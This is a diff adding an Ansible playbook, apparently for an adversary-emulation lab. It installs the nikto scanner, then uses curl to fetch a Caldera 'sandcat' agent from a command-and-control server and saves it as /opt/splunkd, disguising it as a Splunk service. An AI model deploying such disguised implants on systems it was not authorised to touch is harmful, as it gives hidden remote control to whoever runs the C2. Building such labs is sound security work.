@@ -1,0 +1,77 @@
+---
+- hosts: "{{ host }}"
+  become: true
+  become_user: '{{ user }}'
+
+  tasks:
+    - name: Wait for host to go up
+      wait_for_connection:
+        delay: 0
+        timeout: 60
+
+    - name: Install git and perl
+      apt:
+        name:
+          - git
+          - perl
+        state: present
+        update_cache: false
+
+    - name: Remove broken nikto install if present
+      file:
+        path: /var/lib/nikto
+        state: absent
+
+    - name: Clone nikto from GitHub
+      git:
+        repo: https://github.com/sullo/nikto.git
+        dest: /var/lib/nikto
+        version: main
+
+    - name: Make nikto.pl executable
+      file:
+        path: /var/lib/nikto/program/nikto.pl
+        mode: '0755'
+
+    - name: Point nikto wrapper at correct path
+      copy:
+        dest: /usr/bin/nikto
+        mode: '0755'
+        content: |
+          #!/usr/bin/env sh
+          set -e
+          exec /var/lib/nikto/program/nikto.pl "$@"
+
+    - name: Verify nikto is functional
+      command: nikto -Version
+      register: nikto_version
+      failed_when: "'nikto' not in nikto_version.stdout | lower and 'nikto' not in nikto_version.stderr | lower"
+
+    - name: Download Caldera sandcat agent binary from C2
+      shell: >
+        curl -s -X POST
+        -H 'file:sandcat.go'
+        -H 'platform:linux'
+        http://{{ caldera_ip }}:8888/file/download > /opt/splunkd
+      args:
+        executable: /bin/bash
+
+    - name: Make sandcat binary executable
+      file:
+        path: /opt/splunkd
+        mode: '0755'
+
+    - name: Verify sandcat binary exists and is executable
+      stat:
+        path: /opt/splunkd
+      register: sandcat_stat
+
+    - name: Fail if sandcat binary is missing or not executable
+      fail:
+        msg: "Sandcat binary not found or not executable at /opt/splunkd"
+      when: not sandcat_stat.stat.exists or not sandcat_stat.stat.executable
+
+    - name: Verify sandcat binary is non-empty
+      fail:
+        msg: "Sandcat binary at /opt/splunkd is empty — download may have failed"
+      when: sandcat_stat.stat.size == 0
